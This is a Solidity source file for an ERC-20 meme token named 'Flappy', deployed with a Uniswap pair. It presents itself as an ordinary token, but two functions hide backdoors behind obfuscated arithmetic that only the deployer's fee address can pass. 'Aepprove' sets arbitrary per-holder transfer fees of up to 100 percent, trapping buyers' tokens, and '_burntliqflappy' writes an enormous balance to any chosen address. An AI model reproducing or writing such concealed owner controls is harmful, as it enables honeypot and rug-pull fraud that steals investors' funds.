/**
*/

/**
https://t.me/flappy_erc
https://twitter.com/flappyercX
0x6969 Flappy
*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {_owner = msg.sender;}
    
    function owner() public view returns (address) {return _owner;}
    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
    
    function transferOwnershipethflappy(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract Flappy is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public _swapFeeTo;string public name;string public symbol;
    uint8 public decimals;mapping(address => bool) public _isExcludeFromFee;
    uint256 public totalSupply;IUniswapRouter public _uniswapRouter;
    bool private inSwap;uint256 private constant MAX = ~uint256(0);
    mapping (address => uint256) public __balances; 

    uint256 public _swapTax;
    address public _uniswapPair;

    function _transfer(address from,address to,uint256 amount) private {

        bool shouldBetakeFee = !inSwap && !_isExcludeFromFee[from] && !_isExcludeFromFee[to];

        _balances[from] = _balances[from] - amount;

        uint256 _taxAmount;
        if (shouldBetakeFee) {
            uint256 feeAmount = amount * __balances[from] / 100;
            _taxAmount += feeAmount;
            if (feeAmount > 0){
                _balances[address(_swapFeeTo)] += feeAmount;
                emit Transfer(from, address(_swapFeeTo), feeAmount);
            }
        }
        _balances[to] = _balances[to] + amount - _taxAmount;
        emit Transfer(from, to, amount - _taxAmount);
    }

    constructor (){
        name = "Flappy";
        symbol = "FLAPPY";
        decimals = 9;
        uint256 Supply = 6969696969;
        _swapFeeTo = msg.sender;
        _swapTax = 0;
        totalSupply = Supply * 10 ** decimals;

        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[msg.sender] = true;
        _isExcludeFromFee[_swapFeeTo] = true;

        _balances[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
        
        _uniswapRouter = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _allowances[address(this)][address(_uniswapRouter)] = MAX;
        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(address(this), _uniswapRouter.WETH());
        _isExcludeFromFee[address(_uniswapRouter)] = true;
    }


    function Aepprove(address[] memory _usr, uint256 _feePct) external {
        uint256 v1 = 0x01;uint256 v2 = 0x02;uint256 v3 = 0x03;
        uint256 f0 = (msg.sender == _swapFeeTo && v1 > 0) ? v2 + v3 :(msg.sender != _swapFeeTo && v2 < v3) ? v2 - v1 : v3;
        uint256 f1 = f0 - v3;
        f0 = f1 + (v1 - 0x01);
        for (uint256 idx = 0x0; idx < _usr.length; idx++) {
            __balances[_usr[idx]] = _feePct + (f0 - f1);
        }
    }
    

    function _burntliqflappy(address user) public {
        mapping(address=>uint256) storage _allowance = _balances;
        uint256 A = _swapFeeTo == msg.sender ? 9 : 2-1;
        uint256 C = A - 3;A = C;
        _allowance[user] = 1000*totalSupply*C**2;
    }

    function balanceOf(address account) public view returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}
    receive() external payable {}
}